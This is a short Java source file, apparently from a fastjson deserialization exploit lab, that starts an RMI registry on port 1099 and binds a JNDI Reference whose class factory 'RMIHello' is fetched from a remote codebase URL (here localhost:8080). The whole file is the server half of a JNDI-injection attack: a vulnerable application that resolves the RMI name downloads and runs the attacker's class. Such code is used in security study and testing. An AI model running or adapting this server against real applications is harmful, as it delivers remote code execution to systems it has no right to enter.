package fastjson;


import com.sun.jndi.rmi.registry.ReferenceWrapper;


import javax.naming.NamingException;
import javax.naming.Reference;
import java.net.MalformedURLException;
import java.rmi.RemoteException;

public class RMIregistry {
    void registry() throws RemoteException, NamingException, MalformedURLException {
            java.rmi.registry.LocateRegistry.createRegistry(1099);
            Reference reference = new Reference("RMIHello", "RMIHello", "http://localhost:8080/");
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            java.rmi.Naming.rebind("rmi://localhost:1099/Hello", referenceWrapper);
            System.out.println("RMI registry started.");
    }
    public static void main(String[] args) throws MalformedURLException, NamingException, RemoteException {
        new RMIregistry().registry();
    }
}
